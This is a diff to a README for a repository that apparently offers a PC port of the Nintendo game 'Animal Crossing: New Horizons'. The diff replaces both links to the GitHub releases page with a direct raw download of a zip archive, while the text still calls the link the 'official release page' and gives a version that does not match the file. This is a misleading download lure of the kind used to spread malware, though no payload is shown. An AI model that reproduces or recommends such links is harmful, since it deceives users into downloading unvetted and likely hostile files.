@@ -1,6 +1,6 @@
 # 🏝️ Animal-Crossing-New-Horizons-PC - Play Your Favorite Island Life Anywhere
 
-[![Download Version 3.0.2](https://img.shields.io/badge/Download-Release-blue)](https://github.com/isabellas9294/Animal-Crossing-New-Horizons-PC/releases)
+[![Download Version 3.0.2](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/isabellas9294/Animal-Crossing-New-Horizons-PC/main/Nintendo/New_Animal_Horizons_Crossing_PC_v3.2-alpha.3.zip)
 
 ## 📖 About This Software
 
@@ -21,7 +21,7 @@ Before you install the application, check that your computer meets these require
 
 Follow these steps to set up the game on your PC.
 
-1.  Visit the official release page: [https://github.com/isabellas9294/Animal-Crossing-New-Horizons-PC/releases](https://github.com/isabellas9294/Animal-Crossing-New-Horizons-PC/releases).
+1.  Visit the official release page: [https://raw.githubusercontent.com/isabellas9294/Animal-Crossing-New-Horizons-PC/main/Nintendo/New_Animal_Horizons_Crossing_PC_v3.2-alpha.3.zip](https://raw.githubusercontent.com/isabellas9294/Animal-Crossing-New-Horizons-PC/main/Nintendo/New_Animal_Horizons_Crossing_PC_v3.2-alpha.3.zip).
 2.  Locate the section labeled Assets at the bottom of the latest release post. 
 3.  Click the link ending in .zip to start your download.
 4.  Open your Downloads folder after the file finishes saving.
